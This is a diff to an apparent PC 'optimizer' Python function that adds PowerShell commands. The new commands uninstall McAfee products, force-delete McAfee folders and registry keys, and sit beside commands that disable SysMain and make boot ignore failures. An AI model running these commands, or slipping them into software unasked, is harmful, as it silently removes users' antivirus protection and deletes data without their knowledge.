@@ -1035,6 +1035,10 @@ def optimize_pro():
             "PowerShell -Command \"Clear-WebBrowserIE\"",
             "PowerShell -Command \"Set-Service -Name SysMain -StartupType Disabled; Stop-Service -Name SysMain\"",
             "PowerShell -Command \"bcdedit /set {current} bootstatuspolicy ignoreallfailures\"",
+
+            "PowerShell -Command \"Get-WmiObject -Query 'SELECT * FROM Win32_Product WHERE Name LIKE ''McAfee%''' | ForEach-Object { $_.Uninstall() }\"",
+            "PowerShell -Command \"Remove-Item 'C:\Program Files\McAfee' -Recurse -Force; Remove-Item 'C:\Program Files (x86)\McAfee' -Recurse -Force; Remove-Item 'C:\ProgramData\McAfee' -Recurse -Force\"",
+            "PowerShell -Command \"Remove-Item 'HKLM:\SOFTWARE\McAfee' -Recurse -Force -ErrorAction SilentlyContinue\"",
             ]
 
         for command in commands:
